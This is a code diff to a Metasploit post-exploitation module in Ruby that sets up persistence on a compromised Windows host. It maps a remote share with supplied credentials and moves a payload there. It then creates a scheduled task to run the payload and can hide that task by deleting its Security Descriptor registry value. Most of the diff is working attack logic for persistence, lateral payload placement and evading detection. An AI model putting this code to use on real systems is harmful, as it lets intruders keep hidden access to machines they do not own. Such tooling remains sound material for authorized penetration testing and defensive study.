@@ -63,9 +63,9 @@ class MetasploitModule < Msf::Post
         OptString.new('RemoteExePath', [
           false,
           'The remote path to move the payload to. Only valid when the STARTUP option is set '\
-          'to TASK and the ScheduleRemoteSystem option is set. Use the same path than LocalExePath '\
+          'to TASK and the `ScheduleRemoteSystem` option is set. Use the same path than LocalExePath '\
           'if not set.'
-        ]),
+        ], conditions: ['STARTUP', '==', 'TASK']),
         OptString.new('StartupName', [false, 'The name of service, registry or scheduled task. Random string as default.' ]),
         OptString.new('ServiceDescription', [false, 'The description of service. Random string as default.' ])
       ]
@@ -240,38 +240,42 @@ class MetasploitModule < Msf::Post
     File.binread(exec)
   end
 
-  def execute_cmd(cmd)
-    verification_token = Rex::Text.rand_text_alphanumeric(8)
-    result = cmd_exec("cmd /c #{cmd} & if not errorlevel 1 echo #{verification_token}")
-    result.include?(verification_token)
-  end
-
   def move_to_remote(remote_host, script_on_target, remote_path)
     print_status("Moving payload file to the remote host (#{remote_host})")
 
     # Translate local path to remote path. Basically, change any "<drive letter>:" to "<drive letter>$"
-    remote_path = remote_path.split('\\')
+    remote_path = remote_path.split('\\').delete_if(&:empty?)
     remote_exe = remote_path.pop
     remote_path[0].sub!(/^(?<drive>[A-Z]):/i, '\k<drive>$') unless remote_path.empty?
     remote_path.prepend(remote_host)
     remote_path = "\\\\#{remote_path.join('\\')}"
+    cmd = "net use #{remote_path}"
+    if datastore['ScheduleUsername'].present?
+      cmd << " /user:#{datastore['ScheduleUsername']}"
+      cmd << " #{datastore['SchedulePassword']}" if datastore['SchedulePassword'].present?
+    end
 
-    result = execute_cmd("net use #{remote_path} /user:#{datastore['ScheduleUsername']} #{datastore['SchedulePassword']}")
-    unless result
-      print_error("Unable to connect to the remote host: #{result}")
+    vprint_status("Execute command: #{cmd}")
+    result = cmd_exec_with_result(cmd)
+    unless result[1]
+      print_error(
+        "Unable to connect to the remote host. Check credentials, `RemoteExePath`, "\
+        "`LocalExePath` and SMB version compatibility on both hosts. Error: #{result[0]}"
+      )
       return false
     end
 
     # #move_file helper does not work when the target is a remote host and the session run as SYSTEM. It works with #cmd_exec.
-    result = execute_cmd("move \"#{script_on_target}\" \"#{remote_path}\\#{remote_exe}\"")
-    if result
+    result = cmd_exec_with_result("move /y \"#{script_on_target}\" \"#{remote_path}\\#{remote_exe}\"")
+    if result[1]
       print_good("Moved #{script_on_target} to #{remote_path}\\#{remote_exe}")
     else
-      print_error('Unable to move the file to the remote host')
+      print_error("Unable to move the file to the remote host. Error: #{result[0]}")
     end
 
-    unless execute_cmd("net use #{remote_path} /delete")
-      print_warning('Unable to close the network connection with the remote host. This will have to be done manually')
+    result = cmd_exec_with_result("net use #{remote_path} /delete")
+    unless result[1]
+      print_warning("Unable to close the network connection with the remote host. This will have to be done manually. Error: #{result[0]}")
     end
 
     return !!result
@@ -286,32 +290,36 @@ class MetasploitModule < Msf::Post
     end
 
     remote_host = datastore['ScheduleRemoteSystem']
-    print_status("Creating a #{datastore['ScheduleType']} scheduler task#{" on #{remote_host}" unless remote_host.nil?}")
+    print_status("Creating a #{datastore['ScheduleType']} scheduler task#{" on #{remote_host}" if remote_host.present?}")
 
-    unless remote_host.nil?
+    if remote_host.present?
       remote_path = script_on_target
-      remote_path = "#{datastore['RemoteExePath']}\\#{datastore['REXENAME']}" if datastore['RemoteExePath']
+      if datastore['RemoteExePath'].present?
+        remote_path = datastore['RemoteExePath'].split('\\').delete_if(&:empty?).join('\\')
+        remote_path = "#{remote_path}\\#{datastore['REXENAME']}"
+      end
       return false unless move_to_remote(remote_host, script_on_target, remote_path)
 
       @cleanup_host = remote_host
       @clean_up_rc = "rm #{remote_path.gsub('\\', '\\\\\\\\')}\n"
     end
 
-    task_name = datastore['StartupName'] || Rex::Text.rand_text_alpha(rand(8..15))
-    print_status(
-      "Creating task '#{task_name}'"\
-      "#{' and removing the Security Descriptor registry key value to hide the task' if datastore['ObfuscateTask']}"
-    )
-    if datastore['ScheduleRemoteSystem']
+    task_name = datastore['StartupName'].present? ? datastore['StartupName'] : Rex::Text.rand_text_alpha(rand(8..15))
+
+    print_status("Task name: '#{task_name}'")
+    if datastore['ScheduleObfuscateTask']
+      print_status('Also, removing the Security Descriptor registry key value to hide the task')
+    end
+    if datastore['ScheduleRemoteSystem'].present?
       if Rex::Socket.dotted_ip?(datastore['ScheduleRemoteSystem'])
         print_warning(
           "The task will be created on the remote host #{datastore['ScheduleRemoteSystem']} and since "\
           'the FQDN is not used, it usually takes some time (> 1 min) due to some DNS resolution'\
           ' happening in the background'
         )
-        if datastore['ObfuscateTask']
+        if datastore['ScheduleObfuscateTask']
           print_warning(
-            'Also, since the \'ObfuscateTask\' option has been set, it will take much more time '\
+            'Also, since the \'ScheduleObfuscateTask\' option has been set, it will take much more time '\
             'to be executed on the remote host for the same reasons (> 3 min). Don\'t Ctrl-C, even '\
             'if a session pops up, be patient or use a FQDN in `ScheduleRemoteSystem` option.'
           )
@@ -323,18 +331,23 @@ class MetasploitModule < Msf::Post
     end
 
     begin
-      task_create(task_name, remote_host.nil? ? script_on_target : remote_path)
+      task_create(task_name, remote_host.blank? ? script_on_target : remote_path)
+    rescue TaskSchedulerObfuscationError => e
+      print_warning(e.message)
+      print_good('Task created without obfuscation')
     rescue TaskSchedulerError => e
       print_error("Task creation error: #{e}")
+      return
+    else
+      print_good('Task created')
+      if datastore['ScheduleObfuscateTask']
+        @clean_up_rc << "reg setval -k '#{TaskSch::TASK_REG_KEY.gsub('\\') { '\\\\' }}\\\\#{task_name}' "\
+                        "-v '#{TaskSch::TASK_SD_REG_VALUE}' "\
+                        "-d '#{TaskSch::DEFAULT_SD}' "\
+                        "-t 'REG_BINARY'#{ " -w '64'" unless @old_os}\n"
+      end
     end
-    print_good('Task created!')
 
-    if datastore['ObfuscateTask']
-      @clean_up_rc << "reg setval -k '#{TaskSch::TASK_REG_KEY.gsub('\\') { '\\\\' }}\\#{task_name}' "\
-                      "-v '#{TaskSch::TASK_SD_REG_VALUE}' "\
-                      "-d '#{TaskSch::DEFAULT_SD.unpack('C*').map { |v| v.ord.to_s(16).rjust(2, '0') }.join}' "\
-                      "-t 'REG_BINARY'\n"
-    end
     @clean_up_rc << "execute -H -f schtasks -a \"/delete /tn #{task_name} /f\"\n"
   end
 end
